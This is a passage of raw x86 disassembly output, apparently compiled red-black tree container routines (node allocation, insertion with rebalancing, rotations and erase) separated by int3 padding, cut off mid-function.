   14010:	cmp    DWORD PTR ds:0x7f6c8,edi
   14016:	jne    0x1402d
   14018:	mov    ecx,eax
   1401a:	mov    DWORD PTR ds:0x7f6c8,ecx
   14020:	mov    DWORD PTR [ecx],edi
   14022:	mov    ecx,DWORD PTR ds:0x7f6c8
   14028:	xor    eax,eax
   1402a:	mov    DWORD PTR [ecx+0x8],edi
   1402d:	inc    DWORD PTR ds:0x7f820
   14033:	cmp    eax,edi
   14035:	je     0x1403e
   14037:	push   eax
   14038:	call   0x10a9a
   1403d:	pop    ecx
   1403e:	push   edi
   1403f:	push   DWORD PTR ds:0x7f6c8
   14045:	mov    ecx,esi
   14047:	call   0x1395c
   1404c:	mov    DWORD PTR [esi+0xc],edi
   1404f:	mov    DWORD PTR [esi+0x4],eax
   14052:	mov    DWORD PTR [eax],eax
   14054:	mov    esi,DWORD PTR [esi+0x4]
   14057:	pop    edi
   14058:	mov    DWORD PTR [esi+0x8],esi
   1405b:	pop    esi
   1405c:	ret    
   1405d:	int3   
   1405e:	int3   
   1405f:	int3   
   14060:	int3   
   14061:	int3   
   14062:	mov    edi,edi
   14064:	push   ebp
   14065:	mov    ebp,esp
   14067:	push   esi
   14068:	push   edi
   14069:	push   DWORD PTR [ebp+0xc]
   1406c:	mov    edi,ecx
   1406e:	call   0x13120
   14073:	push   DWORD PTR [ebp+0xc]
   14076:	mov    ecx,edi
   14078:	mov    esi,eax
   1407a:	call   0x12e08
   1407f:	mov    ecx,DWORD PTR [ebp+0x8]
   14082:	pop    edi
   14083:	mov    DWORD PTR [ecx],eax
   14085:	mov    DWORD PTR [ecx+0x4],esi
   14088:	mov    eax,ecx
   1408a:	pop    esi
   1408b:	pop    ebp
   1408c:	ret    0x8
   1408f:	int3   
   14090:	int3   
   14091:	int3   
   14092:	int3   
   14093:	int3   
   14094:	mov    edi,edi
   14096:	push   esi
   14097:	push   edi
   14098:	push   0x1
   1409a:	xor    edi,edi
   1409c:	push   edi
   1409d:	mov    esi,ecx
   1409f:	call   0x13980
   140a4:	cmp    DWORD PTR ds:0x7f6d4,edi
   140aa:	jne    0x140c1
   140ac:	mov    ecx,eax
   140ae:	mov    DWORD PTR ds:0x7f6d4,ecx
   140b4:	mov    DWORD PTR [ecx],edi
   140b6:	mov    ecx,DWORD PTR ds:0x7f6d4
   140bc:	xor    eax,eax
   140be:	mov    DWORD PTR [ecx+0x8],edi
   140c1:	inc    DWORD PTR ds:0x7f824
   140c7:	cmp    eax,edi
   140c9:	je     0x140d2
   140cb:	push   eax
   140cc:	call   0x10a9a
   140d1:	pop    ecx
   140d2:	push   edi
   140d3:	push   DWORD PTR ds:0x7f6d4
   140d9:	mov    ecx,esi
   140db:	call   0x13980
   140e0:	mov    DWORD PTR [esi+0xc],edi
   140e3:	mov    DWORD PTR [esi+0x4],eax
   140e6:	mov    DWORD PTR [eax],eax
   140e8:	mov    esi,DWORD PTR [esi+0x4]
   140eb:	pop    edi
   140ec:	mov    DWORD PTR [esi+0x8],esi
   140ef:	pop    esi
   140f0:	ret    
   140f1:	int3   
   140f2:	int3   
   140f3:	int3   
   140f4:	int3   
   140f5:	int3   
   140f6:	mov    edi,edi
   140f8:	push   ebp
   140f9:	mov    ebp,esp
   140fb:	push   esi
   140fc:	push   edi
   140fd:	push   DWORD PTR [ebp+0xc]
   14100:	mov    edi,ecx
   14102:	call   0x131fe
   14107:	push   DWORD PTR [ebp+0xc]
   1410a:	mov    ecx,edi
   1410c:	mov    esi,eax
   1410e:	call   0x12e48
   14113:	mov    ecx,DWORD PTR [ebp+0x8]
   14116:	pop    edi
   14117:	mov    DWORD PTR [ecx],eax
   14119:	mov    DWORD PTR [ecx+0x4],esi
   1411c:	mov    eax,ecx
   1411e:	pop    esi
   1411f:	pop    ebp
   14120:	ret    0x8
   14123:	int3   
   14124:	int3   
   14125:	int3   
   14126:	int3   
   14127:	int3   
   14128:	mov    edi,edi
   1412a:	push   esi
   1412b:	push   edi
   1412c:	push   0x1
   1412e:	xor    edi,edi
   14130:	push   edi
   14131:	mov    esi,ecx
   14133:	call   0x139ec
   14138:	cmp    DWORD PTR ds:0x7f6d8,edi
   1413e:	jne    0x14155
   14140:	mov    ecx,eax
   14142:	mov    DWORD PTR ds:0x7f6d8,ecx
   14148:	mov    DWORD PTR [ecx],edi
   1414a:	mov    ecx,DWORD PTR ds:0x7f6d8
   14150:	xor    eax,eax
   14152:	mov    DWORD PTR [ecx+0x8],edi
   14155:	inc    DWORD PTR ds:0x7f828
   1415b:	cmp    eax,edi
   1415d:	je     0x14166
   1415f:	push   eax
   14160:	call   0x10a9a
   14165:	pop    ecx
   14166:	push   edi
   14167:	push   DWORD PTR ds:0x7f6d8
   1416d:	mov    ecx,esi
   1416f:	call   0x139ec
   14174:	mov    DWORD PTR [esi+0xc],edi
   14177:	mov    DWORD PTR [esi+0x4],eax
   1417a:	mov    DWORD PTR [eax],eax
   1417c:	mov    esi,DWORD PTR [esi+0x4]
   1417f:	pop    edi
   14180:	mov    DWORD PTR [esi+0x8],esi
   14183:	pop    esi
   14184:	ret    
   14185:	int3   
   14186:	int3   
   14187:	int3   
   14188:	int3   
   14189:	int3   
   1418a:	mov    edi,edi
   1418c:	push   ebp
   1418d:	mov    ebp,esp
   1418f:	push   esi
   14190:	push   edi
   14191:	push   DWORD PTR [ebp+0xc]
   14194:	mov    edi,ecx
   14196:	call   0x132dc
   1419b:	push   DWORD PTR [ebp+0xc]
   1419e:	mov    ecx,edi
   141a0:	mov    esi,eax
   141a2:	call   0x12e88
   141a7:	mov    ecx,DWORD PTR [ebp+0x8]
   141aa:	pop    edi
   141ab:	mov    DWORD PTR [ecx],eax
   141ad:	mov    DWORD PTR [ecx+0x4],esi
   141b0:	mov    eax,ecx
   141b2:	pop    esi
   141b3:	pop    ebp
   141b4:	ret    0x8
   141b7:	int3   
   141b8:	int3   
   141b9:	int3   
   141ba:	int3   
   141bb:	int3   
   141bc:	mov    edi,edi
   141be:	push   esi
   141bf:	push   edi
   141c0:	push   0x1
   141c2:	xor    edi,edi
   141c4:	push   edi
   141c5:	mov    esi,ecx
   141c7:	call   0x1395c
   141cc:	cmp    DWORD PTR ds:0x7f6dc,edi
   141d2:	jne    0x141e9
   141d4:	mov    ecx,eax
   141d6:	mov    DWORD PTR ds:0x7f6dc,ecx
   141dc:	mov    DWORD PTR [ecx],edi
   141de:	mov    ecx,DWORD PTR ds:0x7f6dc
   141e4:	xor    eax,eax
   141e6:	mov    DWORD PTR [ecx+0x8],edi
   141e9:	inc    DWORD PTR ds:0x7f82c
   141ef:	cmp    eax,edi
   141f1:	je     0x141fa
   141f3:	push   eax
   141f4:	call   0x10a9a
   141f9:	pop    ecx
   141fa:	push   edi
   141fb:	push   DWORD PTR ds:0x7f6dc
   14201:	mov    ecx,esi
   14203:	call   0x1395c
   14208:	mov    DWORD PTR [esi+0xc],edi
   1420b:	mov    DWORD PTR [esi+0x4],eax
   1420e:	mov    DWORD PTR [eax],eax
   14210:	mov    esi,DWORD PTR [esi+0x4]
   14213:	pop    edi
   14214:	mov    DWORD PTR [esi+0x8],esi
   14217:	pop    esi
   14218:	ret    
   14219:	int3   
   1421a:	int3   
   1421b:	int3   
   1421c:	int3   
   1421d:	int3   
   1421e:	mov    edi,edi
   14220:	push   ebp
   14221:	mov    ebp,esp
   14223:	push   ecx
   14224:	push   esi
   14225:	push   DWORD PTR [ebp+0xc]
   14228:	mov    esi,ecx
   1422a:	call   0x13314
   1422f:	mov    DWORD PTR [ebp-0x4],eax
   14232:	cmp    eax,DWORD PTR [esi+0x4]
   14235:	je     0x1424c
   14237:	add    eax,0xc
   1423a:	push   eax
   1423b:	push   DWORD PTR [ebp+0xc]
   1423e:	call   0x19818
   14243:	test   al,al
   14245:	jne    0x1424c
   14247:	lea    eax,[ebp-0x4]
   1424a:	jmp    0x14255
   1424c:	mov    eax,DWORD PTR [esi+0x4]
   1424f:	mov    DWORD PTR [ebp+0xc],eax
   14252:	lea    eax,[ebp+0xc]
   14255:	mov    ecx,DWORD PTR [eax]
   14257:	mov    eax,DWORD PTR [ebp+0x8]
   1425a:	mov    DWORD PTR [eax],ecx
   1425c:	pop    esi
   1425d:	leave  
   1425e:	ret    0x8
   14261:	int3   
   14262:	int3   
   14263:	int3   
   14264:	int3   
   14265:	int3   
   14266:	mov    edi,edi
   14268:	push   ebp
   14269:	mov    ebp,esp
   1426b:	push   ecx
   1426c:	push   ecx
   1426d:	push   ebx
   1426e:	push   esi
   1426f:	mov    DWORD PTR [ebp-0x4],ecx
   14272:	push   edi
   14273:	mov    edi,DWORD PTR [ebp+0xc]
   14276:	lea    ecx,[ebp+0xc]
   14279:	call   0x12f36
   1427e:	mov    esi,DWORD PTR [edi]
   14280:	mov    eax,ds:0x7f6cc
   14285:	mov    ebx,edi
   14287:	mov    DWORD PTR [ebp-0x8],esi
   1428a:	cmp    esi,eax
   1428c:	jne    0x142aa
   1428e:	mov    esi,DWORD PTR [edi+0x8]
   14291:	mov    eax,DWORD PTR [ebx+0x4]
   14294:	mov    ecx,DWORD PTR [ebp-0x4]
   14297:	mov    DWORD PTR [esi+0x4],eax
   1429a:	mov    eax,DWORD PTR [ecx+0x4]
   1429d:	cmp    DWORD PTR [eax+0x4],edi
   142a0:	jne    0x1431f
   142a2:	mov    DWORD PTR [eax+0x4],esi
   142a5:	jmp    0x1432d
   142aa:	mov    ecx,DWORD PTR [edi+0x8]
   142ad:	cmp    ecx,eax
   142af:	je     0x14291
   142b1:	push   ecx
   142b2:	call   0x11242
   142b7:	mov    ebx,eax
   142b9:	mov    esi,DWORD PTR [ebx+0x8]
   142bc:	cmp    ebx,edi
   142be:	je     0x14291
   142c0:	mov    eax,DWORD PTR [ebp-0x8]
   142c3:	mov    DWORD PTR [eax+0x4],ebx
   142c6:	mov    eax,DWORD PTR [edi]
   142c8:	mov    DWORD PTR [ebx],eax
   142ca:	cmp    ebx,DWORD PTR [edi+0x8]
   142cd:	jne    0x142d4
   142cf:	mov    DWORD PTR [esi+0x4],ebx
   142d2:	jmp    0x142eb
   142d4:	mov    eax,DWORD PTR [ebx+0x4]
   142d7:	mov    DWORD PTR [esi+0x4],eax
   142da:	mov    eax,DWORD PTR [ebx+0x4]
   142dd:	mov    DWORD PTR [eax],esi
   142df:	mov    eax,DWORD PTR [edi+0x8]
   142e2:	mov    DWORD PTR [ebx+0x8],eax
   142e5:	mov    eax,DWORD PTR [edi+0x8]
   142e8:	mov    DWORD PTR [eax+0x4],ebx
   142eb:	mov    eax,DWORD PTR [ebp-0x4]
   142ee:	mov    eax,DWORD PTR [eax+0x4]
   142f1:	cmp    DWORD PTR [eax+0x4],edi
   142f4:	jne    0x142fb
   142f6:	mov    DWORD PTR [eax+0x4],ebx
   142f9:	jmp    0x14309
   142fb:	mov    eax,DWORD PTR [edi+0x4]
   142fe:	cmp    DWORD PTR [eax],edi
   14300:	jne    0x14306
   14302:	mov    DWORD PTR [eax],ebx
   14304:	jmp    0x14309
   14306:	mov    DWORD PTR [eax+0x8],ebx
   14309:	mov    eax,DWORD PTR [edi+0x4]
   1430c:	mov    DWORD PTR [ebx+0x4],eax
   1430f:	mov    eax,DWORD PTR [ebx+0x10]
   14312:	mov    ecx,DWORD PTR [edi+0x10]
   14315:	mov    DWORD PTR [ebx+0x10],ecx
   14318:	mov    DWORD PTR [edi+0x10],eax
   1431b:	mov    ebx,edi
   1431d:	jmp    0x14380
   1431f:	mov    eax,DWORD PTR [edi+0x4]
   14322:	cmp    DWORD PTR [eax],edi
   14324:	jne    0x1432a
   14326:	mov    DWORD PTR [eax],esi
   14328:	jmp    0x1432d
   1432a:	mov    DWORD PTR [eax+0x8],esi
   1432d:	mov    eax,DWORD PTR [ecx+0x4]
   14330:	mov    DWORD PTR [ebp-0x8],eax
   14333:	cmp    DWORD PTR [eax],edi
   14335:	jne    0x14357
   14337:	mov    edx,DWORD PTR [edi+0x8]
   1433a:	cmp    edx,DWORD PTR ds:0x7f6cc
   14340:	jne    0x14349
   14342:	mov    edx,DWORD PTR [edi+0x4]
   14345:	mov    DWORD PTR [eax],edx
   14347:	jmp    0x14357
   14349:	push   esi
   1434a:	call   0x11242
   1434f:	mov    ecx,DWORD PTR [ebp-0x8]
   14352:	mov    DWORD PTR [ecx],eax
   14354:	mov    ecx,DWORD PTR [ebp-0x4]
   14357:	mov    eax,DWORD PTR [ecx+0x4]
   1435a:	mov    DWORD PTR [ebp-0x8],eax
   1435d:	cmp    DWORD PTR [eax+0x8],edi
   14360:	jne    0x14380
   14362:	mov    ecx,DWORD PTR [edi]
   14364:	cmp    ecx,DWORD PTR ds:0x7f6cc
   1436a:	jne    0x14374
   1436c:	mov    ecx,DWORD PTR [edi+0x4]
   1436f:	mov    DWORD PTR [eax+0x8],ecx
   14372:	jmp    0x14380
   14374:	push   esi
   14375:	call   0x11220
   1437a:	mov    ecx,DWORD PTR [ebp-0x8]
   1437d:	mov    DWORD PTR [ecx+0x8],eax
   14380:	xor    edi,edi
   14382:	inc    edi
   14383:	cmp    DWORD PTR [ebx+0x10],edi
   14386:	jne    0x1449d
   1438c:	jmp    0x1444b
   14391:	cmp    DWORD PTR [esi+0x10],edi
   14394:	jne    0x1449a
   1439a:	mov    eax,DWORD PTR [esi+0x4]
   1439d:	cmp    esi,DWORD PTR [eax]
   1439f:	jne    0x14416
   143a1:	mov    eax,DWORD PTR [eax+0x8]
   143a4:	cmp    DWORD PTR [eax+0x10],0x0
   143a8:	jne    0x143c2
   143aa:	mov    DWORD PTR [eax+0x10],edi
   143ad:	mov    eax,DWORD PTR [esi+0x4]
   143b0:	and    DWORD PTR [eax+0x10],0x0
   143b4:	push   DWORD PTR [esi+0x4]
   143b7:	call   0x12f6c
   143bc:	mov    eax,DWORD PTR [esi+0x4]
   143bf:	mov    eax,DWORD PTR [eax+0x8]
   143c2:	mov    ecx,DWORD PTR [eax]
   143c4:	cmp    DWORD PTR [ecx+0x10],edi
   143c7:	jne    0x143d1
   143c9:	mov    ecx,DWORD PTR [eax+0x8]
   143cc:	cmp    DWORD PTR [ecx+0x10],edi
   143cf:	je     0x14444
   143d1:	mov    ecx,DWORD PTR [eax+0x8]
   143d4:	cmp    DWORD PTR [ecx+0x10],edi
   143d7:	jne    0x143f1
   143d9:	mov    ecx,DWORD PTR [eax]
   143db:	mov    DWORD PTR [ecx+0x10],edi
   143de:	mov    ecx,DWORD PTR [ebp-0x4]
   143e1:	and    DWORD PTR [eax+0x10],0x0
   143e5:	push   eax
   143e6:	call   0x12fba
   143eb:	mov    eax,DWORD PTR [esi+0x4]
   143ee:	mov    eax,DWORD PTR [eax+0x8]
   143f1:	mov    ecx,DWORD PTR [esi+0x4]
   143f4:	mov    ecx,DWORD PTR [ecx+0x10]
   143f7:	mov    DWORD PTR [eax+0x10],ecx
   143fa:	mov    ecx,DWORD PTR [esi+0x4]
   143fd:	mov    DWORD PTR [ecx+0x10],edi
   14400:	mov    eax,DWORD PTR [eax+0x8]
   14403:	mov    ecx,DWORD PTR [ebp-0x4]
   14406:	mov    DWORD PTR [eax+0x10],edi
   14409:	push   DWORD PTR [esi+0x4]
   1440c:	call   0x12f6c
   14411:	jmp    0x1449a
   14416:	mov    eax,DWORD PTR [eax]
   14418:	cmp    DWORD PTR [eax+0x10],0x0
   1441c:	jne    0x14435
   1441e:	mov    DWORD PTR [eax+0x10],edi
   14421:	mov    eax,DWORD PTR [esi+0x4]
   14424:	and    DWORD PTR [eax+0x10],0x0
   14428:	push   DWORD PTR [esi+0x4]
   1442b:	call   0x12fba
   14430:	mov    eax,DWORD PTR [esi+0x4]
   14433:	mov    eax,DWORD PTR [eax]
   14435:	mov    ecx,DWORD PTR [eax+0x8]
   14438:	cmp    DWORD PTR [ecx+0x10],edi
   1443b:	jne    0x1445c
   1443d:	mov    ecx,DWORD PTR [eax]
   1443f:	cmp    DWORD PTR [ecx+0x10],edi
   14442:	jne    0x1445c
   14444:	and    DWORD PTR [eax+0x10],0x0
   14448:	mov    esi,DWORD PTR [esi+0x4]
   1444b:	mov    ecx,DWORD PTR [ebp-0x4]
   1444e:	mov    eax,DWORD PTR [ecx+0x4]
   14451:	cmp    esi,DWORD PTR [eax+0x4]
   14454:	jne    0x14391
   1445a:	jmp    0x1449a
   1445c:	mov    ecx,DWORD PTR [eax]
   1445e:	cmp    DWORD PTR [ecx+0x10],edi
   14461:	jne    0x1447b
   14463:	mov    ecx,DWORD PTR [eax+0x8]
   14466:	mov    DWORD PTR [ecx+0x10],edi
   14469:	mov    ecx,DWORD PTR [ebp-0x4]
   1446c:	and    DWORD PTR [eax+0x10],0x0
   14470:	push   eax
   14471:	call   0x12f6c
   14476:	mov    eax,DWORD PTR [esi+0x4]
   14479:	mov    eax,DWORD PTR [eax]
   1447b:	mov    ecx,DWORD PTR [esi+0x4]
   1447e:	mov    ecx,DWORD PTR [ecx+0x10]
   14481:	mov    DWORD PTR [eax+0x10],ecx
   14484:	mov    ecx,DWORD PTR [esi+0x4]
   14487:	mov    DWORD PTR [ecx+0x10],edi
   1448a:	mov    eax,DWORD PTR [eax]
   1448c:	mov    ecx,DWORD PTR [ebp-0x4]
   1448f:	mov    DWORD PTR [eax+0x10],edi
   14492:	push   DWORD PTR [esi+0x4]
   14495:	call   0x12fba
   1449a:	mov    DWORD PTR [esi+0x10],edi
   1449d:	push   ebx
   1449e:	call   0x10a9a
   144a3:	mov    eax,DWORD PTR [ebp-0x4]
   144a6:	dec    DWORD PTR [eax+0xc]
   144a9:	mov    eax,DWORD PTR [ebp+0x8]
   144ac:	pop    ecx
   144ad:	mov    ecx,DWORD PTR [ebp+0xc]
   144b0:	pop    edi
   144b1:	pop    esi
   144b2:	mov    DWORD PTR [eax],ecx
   144b4:	pop    ebx
   144b5:	leave  
   144b6:	ret    0x8
   144b9:	int3   
   144ba:	int3   
   144bb:	int3   
   144bc:	int3   
   144bd:	int3   
   144be:	mov    edi,edi
   144c0:	push   ebp
   144c1:	mov    ebp,esp
   144c3:	push   esi
   144c4:	push   edi
   144c5:	push   DWORD PTR [ebp+0xc]
   144c8:	mov    edi,ecx
   144ca:	call   0x1346a
   144cf:	push   DWORD PTR [ebp+0xc]
   144d2:	mov    ecx,edi
   144d4:	mov    esi,eax
   144d6:	call   0x13432
   144db:	mov    ecx,DWORD PTR [ebp+0x8]
   144de:	pop    edi
   144df:	mov    DWORD PTR [ecx],eax
   144e1:	mov    DWORD PTR [ecx+0x4],esi
   144e4:	mov    eax,ecx
   144e6:	pop    esi
   144e7:	pop    ebp
   144e8:	ret    0x8
   144eb:	int3   
   144ec:	int3   
   144ed:	int3   
   144ee:	int3   
   144ef:	int3   
   144f0:	mov    edi,edi
   144f2:	push   esi
   144f3:	push   edi
   144f4:	push   0x1
   144f6:	xor    edi,edi
   144f8:	push   edi
   144f9:	mov    esi,ecx
   144fb:	call   0x139a4
   14500:	cmp    DWORD PTR ds:0x7f6cc,edi
   14506:	jne    0x1451d
   14508:	mov    ecx,eax
   1450a:	mov    DWORD PTR ds:0x7f6cc,ecx
   14510:	mov    DWORD PTR [ecx],edi
   14512:	mov    ecx,DWORD PTR ds:0x7f6cc
   14518:	xor    eax,eax
   1451a:	mov    DWORD PTR [ecx+0x8],edi
   1451d:	inc    DWORD PTR ds:0x7f830
   14523:	cmp    eax,edi
   14525:	je     0x1452e
   14527:	push   eax
   14528:	call   0x10a9a
   1452d:	pop    ecx
   1452e:	push   edi
   1452f:	push   DWORD PTR ds:0x7f6cc
   14535:	mov    ecx,esi
   14537:	call   0x139a4
   1453c:	mov    DWORD PTR [esi+0xc],edi
   1453f:	mov    DWORD PTR [esi+0x4],eax
   14542:	mov    DWORD PTR [eax],eax
   14544:	mov    esi,DWORD PTR [esi+0x4]
   14547:	pop    edi
   14548:	mov    DWORD PTR [esi+0x8],esi
   1454b:	pop    esi
   1454c:	ret    
   1454d:	int3   
   1454e:	int3   
   1454f:	int3   
   14550:	int3   
   14551:	int3   
   14552:	mov    edi,edi
   14554:	push   ebp
   14555:	mov    ebp,esp
   14557:	push   ebx
   14558:	push   esi
   14559:	mov    esi,DWORD PTR [ebp+0x10]
   1455c:	push   edi
   1455d:	push   0x0
   1455f:	push   esi
   14560:	mov    edi,ecx
   14562:	call   0x139a4
   14567:	push   DWORD PTR [ebp+0x14]
   1456a:	mov    ebx,eax
   1456c:	mov    eax,ds:0x7f6cc
   14571:	mov    DWORD PTR [ebx],eax
   14573:	mov    eax,ds:0x7f6cc
   14578:	mov    DWORD PTR [ebx+0x8],eax
   1457b:	lea    eax,[ebx+0xc]
   1457e:	push   eax
   1457f:	call   0x11658
   14584:	inc    DWORD PTR [edi+0xc]
   14587:	cmp    esi,DWORD PTR [edi+0x4]
   1458a:	je     0x145ae
   1458c:	mov    eax,DWORD PTR [ebp+0xc]
   1458f:	cmp    eax,DWORD PTR ds:0x7f6cc
   14595:	jne    0x145ae
   14597:	mov    eax,DWORD PTR [ebp+0x14]
   1459a:	mov    eax,DWORD PTR [eax]
   1459c:	cmp    eax,DWORD PTR [esi+0xc]
   1459f:	jb     0x145ae
   145a1:	mov    DWORD PTR [esi+0x8],ebx
   145a4:	mov    eax,DWORD PTR [edi+0x4]
   145a7:	cmp    esi,DWORD PTR [eax+0x8]
   145aa:	jne    0x145c8
   145ac:	jmp    0x145bd
   145ae:	mov    DWORD PTR [esi],ebx
   145b0:	mov    eax,DWORD PTR [edi+0x4]
   145b3:	cmp    esi,eax
   145b5:	jne    0x145c2
   145b7:	mov    DWORD PTR [eax+0x4],ebx
   145ba:	mov    eax,DWORD PTR [edi+0x4]
   145bd:	mov    DWORD PTR [eax+0x8],ebx
   145c0:	jmp    0x145c8
   145c2:	cmp    esi,DWORD PTR [eax]
   145c4:	jne    0x145c8
   145c6:	mov    DWORD PTR [eax],ebx
   145c8:	mov    eax,DWORD PTR [edi+0x4]
   145cb:	mov    esi,ebx
   145cd:	cmp    ebx,DWORD PTR [eax+0x4]
   145d0:	je     0x14684
   145d6:	mov    eax,DWORD PTR [esi+0x4]
   145d9:	xor    edx,edx
   145db:	cmp    DWORD PTR [eax+0x10],edx
   145de:	jne    0x14684
   145e4:	mov    ecx,DWORD PTR [eax+0x4]
   145e7:	cmp    eax,DWORD PTR [ecx]
   145e9:	jne    0x14625
   145eb:	mov    ecx,DWORD PTR [ecx+0x8]
   145ee:	cmp    DWORD PTR [ecx+0x10],edx
   145f1:	je     0x1462c
   145f3:	cmp    esi,DWORD PTR [eax+0x8]
   145f6:	jne    0x14602
   145f8:	mov    esi,eax
   145fa:	push   esi
   145fb:	mov    ecx,edi
   145fd:	call   0x12f6c
   14602:	mov    eax,DWORD PTR [esi+0x4]
   14605:	mov    DWORD PTR [eax+0x10],0x1
   1460c:	mov    eax,DWORD PTR [esi+0x4]
   1460f:	mov    eax,DWORD PTR [eax+0x4]
   14612:	and    DWORD PTR [eax+0x10],0x0
   14616:	mov    eax,DWORD PTR [esi+0x4]
   14619:	push   DWORD PTR [eax+0x4]
   1461c:	mov    ecx,edi
   1461e:	call   0x12fba
   14623:	jmp    0x14678
   14625:	mov    ecx,DWORD PTR [ecx]
   14627:	cmp    DWORD PTR [ecx+0x10],edx
   1462a:	jne    0x14649
   1462c:	mov    edx,eax
   1462e:	xor    eax,eax
   14630:	inc    eax
   14631:	mov    DWORD PTR [edx+0x10],eax
   14634:	mov    DWORD PTR [ecx+0x10],eax
   14637:	mov    eax,DWORD PTR [esi+0x4]
   1463a:	mov    eax,DWORD PTR [eax+0x4]
   1463d:	and    DWORD PTR [eax+0x10],0x0
   14641:	mov    eax,DWORD PTR [esi+0x4]
   14644:	mov    esi,DWORD PTR [eax+0x4]
   14647:	jmp    0x14678
   14649:	cmp    esi,DWORD PTR [eax]
   1464b:	jne    0x14657
   1464d:	mov    esi,eax
   1464f:	push   esi
   14650:	mov    ecx,edi
   14652:	call   0x12fba
   14657:	mov    eax,DWORD PTR [esi+0x4]
   1465a:	mov    DWORD PTR [eax+0x10],0x1
   14661:	mov    eax,DWORD PTR [esi+0x4]
   14664:	mov    eax,DWORD PTR [eax+0x4]
   14667:	and    DWORD PTR [eax+0x10],0x0
   1466b:	mov    eax,DWORD PTR [esi+0x4]
   1466e:	push   DWORD PTR [eax+0x4]
   14671:	mov    ecx,edi
   14673:	call   0x12f6c
   14678:	mov    eax,DWORD PTR [edi+0x4]
   1467b:	cmp    esi,DWORD PTR [eax+0x4]
   1467e:	jne    0x145d6
   14684:	mov    eax,DWORD PTR [edi+0x4]
   14687:	mov    eax,DWORD PTR [eax+0x4]
   1468a:	pop    edi
   1468b:	mov    DWORD PTR [eax+0x10],0x1
   14692:	mov    eax,DWORD PTR [ebp+0x8]
   14695:	pop    esi
   14696:	mov    DWORD PTR [eax],ebx
   14698:	pop    ebx
   14699:	pop    ebp
   1469a:	ret    0x10
   1469d:	int3   
   1469e:	int3   
   1469f:	int3   
   146a0:	int3   
   146a1:	int3   
   146a2:	mov    edi,edi
   146a4:	push   esi
   146a5:	push   edi
   146a6:	push   0x1
   146a8:	xor    edi,edi
   146aa:	push   edi
   146ab:	mov    esi,ecx
   146ad:	call   0x139c8
   146b2:	cmp    DWORD PTR ds:0x7f6d0,edi
   146b8:	jne    0x146cf
   146ba:	mov    ecx,eax
   146bc:	mov    DWORD PTR ds:0x7f6d0,ecx
   146c2:	mov    DWORD PTR [ecx],edi
   146c4:	mov    ecx,DWORD PTR ds:0x7f6d0
   146ca:	xor    eax,eax
   146cc:	mov    DWORD PTR [ecx+0x8],edi
   146cf:	inc    DWORD PTR ds:0x7f834
   146d5:	cmp    eax,edi
   146d7:	je     0x146e0
   146d9:	push   eax
   146da:	call   0x10a9a
   146df:	pop    ecx
   146e0:	push   edi
   146e1:	push   DWORD PTR ds:0x7f6d0
   146e7:	mov    ecx,esi
   146e9:	call   0x139c8
   146ee:	mov    DWORD PTR [esi+0xc],edi
   146f1:	mov    DWORD PTR [esi+0x4],eax
   146f4:	mov    DWORD PTR [eax],eax
   146f6:	mov    esi,DWORD PTR [esi+0x4]
   146f9:	pop    edi
   146fa:	mov    DWORD PTR [esi+0x8],esi
   146fd:	pop    esi
   146fe:	ret    
   146ff:	int3   
   14700:	int3   
   14701:	int3   
   14702:	int3   
   14703:	int3   
   14704:	mov    edi,edi
   14706:	push   ebp
   14707:	mov    ebp,esp
   14709:	push   ebx
   1470a:	push   esi
   1470b:	mov    esi,DWORD PTR [ebp+0x10]
   1470e:	push   edi
   1470f:	push   0x0
   14711:	push   esi
   14712:	mov    edi,ecx
   14714:	call   0x1395c
   14719:	push   DWORD PTR [ebp+0x14]
   1471c:	mov    ebx,eax
   1471e:	mov    eax,ds:0x7f6c8
   14723:	mov    DWORD PTR [ebx],eax
   14725:	mov    eax,ds:0x7f6c8
   1472a:	mov    DWORD PTR [ebx+0x8],eax
   1472d:	lea    eax,[ebx+0xc]
   14730:	push   eax
   14731:	call   0x11674
   14736:	inc    DWORD PTR [edi+0xc]
   14739:	cmp    esi,DWORD PTR [edi+0x4]
   1473c:	je     0x14760
   1473e:	mov    eax,DWORD PTR [ebp+0xc]
   14741:	cmp    eax,DWORD PTR ds:0x7f6c8
   14747:	jne    0x14760
   14749:	mov    eax,DWORD PTR [ebp+0x14]
   1474c:	mov    eax,DWORD PTR [eax]
   1474e:	cmp    eax,DWORD PTR [esi+0xc]
   14751:	jb     0x14760
   14753:	mov    DWORD PTR [esi+0x8],ebx
   14756:	mov    eax,DWORD PTR [edi+0x4]
   14759:	cmp    esi,DWORD PTR [eax+0x8]
   1475c:	jne    0x1477a
   1475e:	jmp    0x1476f
   14760:	mov    DWORD PTR [esi],ebx
   14762:	mov    eax,DWORD PTR [edi+0x4]
   14765:	cmp    esi,eax
   14767:	jne    0x14774
   14769:	mov    DWORD PTR [eax+0x4],ebx
   1476c:	mov    eax,DWORD PTR [edi+0x4]
   1476f:	mov    DWORD PTR [eax+0x8],ebx
   14772:	jmp    0x1477a
   14774:	cmp    esi,DWORD PTR [eax]
   14776:	jne    0x1477a
   14778:	mov    DWORD PTR [eax],ebx
   1477a:	mov    eax,DWORD PTR [edi+0x4]
   1477d:	mov    esi,ebx
   1477f:	cmp    ebx,DWORD PTR [eax+0x4]
   14782:	je     0x14836
   14788:	mov    eax,DWORD PTR [esi+0x4]
   1478b:	xor    edx,edx
   1478d:	cmp    DWORD PTR [eax+0x14],edx
   14790:	jne    0x14836
   14796:	mov    ecx,DWORD PTR [eax+0x4]
   14799:	cmp    eax,DWORD PTR [ecx]
   1479b:	jne    0x147d7
   1479d:	mov    ecx,DWORD PTR [ecx+0x8]
   147a0:	cmp    DWORD PTR [ecx+0x14],edx
   147a3:	je     0x147de
   147a5:	cmp    esi,DWORD PTR [eax+0x8]
   147a8:	jne    0x147b4
   147aa:	mov    esi,eax
   147ac:	push   esi
   147ad:	mov    ecx,edi
   147af:	call   0x12d6a
   147b4:	mov    eax,DWORD PTR [esi+0x4]
   147b7:	mov    DWORD PTR [eax+0x14],0x1
   147be:	mov    eax,DWORD PTR [esi+0x4]
   147c1:	mov    eax,DWORD PTR [eax+0x4]
   147c4:	and    DWORD PTR [eax+0x14],0x0
   147c8:	mov    eax,DWORD PTR [esi+0x4]
   147cb:	push   DWORD PTR [eax+0x4]
   147ce:	mov    ecx,edi
   147d0:	call   0x12db8
   147d5:	jmp    0x1482a
   147d7:	mov    ecx,DWORD PTR [ecx]
   147d9:	cmp    DWORD PTR [ecx+0x14],edx
   147dc:	jne    0x147fb
   147de:	mov    edx,eax
   147e0:	xor    eax,eax
   147e2:	inc    eax
   147e3:	mov    DWORD PTR [edx+0x14],eax
   147e6:	mov    DWORD PTR [ecx+0x14],eax
   147e9:	mov    eax,DWORD PTR [esi+0x4]
